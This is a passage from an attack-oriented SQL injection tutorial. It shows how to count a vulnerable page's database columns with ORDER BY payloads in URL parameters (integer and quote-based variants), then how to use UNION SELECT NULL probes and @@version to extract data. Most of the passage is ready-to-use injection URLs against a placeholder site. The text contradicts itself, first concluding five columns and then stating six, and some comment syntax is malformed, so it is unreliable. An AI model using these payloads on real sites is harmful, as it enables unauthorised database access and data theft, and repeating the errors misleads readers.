USING ORDER-BY TO DETERMINE THE NUMBER OF COLUMNS:

INTEGER METHOD:

OK, so we have found vulnerable page but what now? Now we are going to need to find out the number of columns and then which of the columns is vulnerable so we know which one to use to extract information from. The idea here will follow similar to above where we found the vulnerable site in that we will be taking our working link and adding an ORDER BY statement to it to find interesting information. Here is the first request we would build:
               
	http://www.site.com/index.php?id=725+ORDER+BY+1--

If the page refreshes OK then this generally indicates that there is a column present. We will increase the ORDER BY statement until we find where the columns end and an error is generated, thus proving we found the end. The trick is to just keep repeating until you find a count that error out.

http://www.site.com/index.php?id=725+ORDER+BY+1,2--                         (NO Errors on Page)
http://www.site.com/index.php?id=725+ORDER+BY+1,2,3--                      (NO Errors on Page)
http://www.site.com/index.php?id=725+ORDER+BY+1,2,3,4--                  (NO Errors on Page)
http://www.site.com/index.php?id=725+ORDER+BY+1,2,3,4,5--                (NO Errors on Page)
http://www.site.com/index.php?id=725+ORDER+BY+1,2,3,4,5,6--            (ERRORS FOUND!!!!!)

You will generally know when you find the end of the line as the error message returned will typically include the following text:
                Unknown Column "6"

Where 6 would be the number of the missing column. This error message lets us know that there is one less than what we requested, thus indicating the actual column count. It may not be as clear in all cases, it, might just be the simple fact of triggering an error (just be observant for changes). In the above example it sent error message when we used the ORDER BY 6 query, thus indicating that there are only 5 columns.



STRING METHOD:

There will be occasions when a page will trigger an error message from the initial asterisk check but when you seem to test the ORDER BY to find column count the page just seems to refresh 100% fine no matter how high you make the column count. In these cases we need to update our ORDER BY statement to include some additional items, in these tests we will leave the single quote at the end of our URL, preceding ORDER BY statement, and then we will add some ending bits to the end of our closing tags. I will bold the updated differences in the requests below; hopefully you can see the differences:
               
  http://site.com/index.php?id=725'ORDER+BY+1--+-                                      (NO Error on Page)
  http://site.com/index.php?id=725'ORDER+BY+1,2--+-                                   (NO Error on Page)
  http://site.com/index.php?id=725'ORDER+BY+1,2,3--+-                                (NO Error on Page)
  http://site.com/index.php?id=725'ORDER+BY+1,2,3,4--+-                             (NO Error on Page)
  http://site.com/index.php?id=725'ORDER+BY+1,2,3,4,5--+-                          (NO Error on Page)
  http://site.com/index.php?id=725'ORDER+BY+1,2,3,4,5,6--+-                       (ERRORS FOUND!!)

OR

  http://site.com/index.php?id=725'ORDER+BY+1--+-                                    (NO Error on Page)
  http://site.com/index.php?id=725'ORDER+BY+2--+-                                   (NO Error on Page)
  http://site.com/index.php?id=725'ORDER+BY+3--+-                                  (NO Error on Page)
  http://site.com/index.php?id=725'ORDER+BY+4--+-                                 (NO Error on Page)
  http://site.com/index.php?id=725'ORDER+BY+5--+-                                (NO Error on Page)
  http://site.com/index.php?id=725'ORDER+BY+6--+-                                 (ERRORS FOUND!!)

Again it should be clear when you have found the last column as you should get some type of message indicating that there is an "unknown column "X"" on the refreshed page.

TIP: to save time testing both methods I generally will jump the increments by 5 to start and then move to 25 at a time or more. This will save you a lot of time as it will indicate string or integer type rather quickly and you can simply narrow it down when you find you have gone too far

OK, so now we know there are 6 columns, but what next? Once the column count is known we must determine which of the columns is vulnerable so we can extract information, and for this we will use the UNION SELECT statement...


THE UNION OPERATOR

With union you can combine results of 2 or more select statements into a single result set.

So if you do not know the data type you can use SELECT NULL.

STEPS:

	1. ‘UNION SELECT NULL- -
	2. ‘UNION SELECT NULL,NULL- -
	3. ‘UNION SELECT NULL,NULL,NULL- -
	4. ‘UNION SELECT NULL,NULL,NULL,NULL- -

IF THE QUERY GETS EXECUTED YOU HAVE FOUND THE NUMBER OF COLUMNS

You can now find type etc.		‘UNION SELECT @@version,NULL,NULL- -





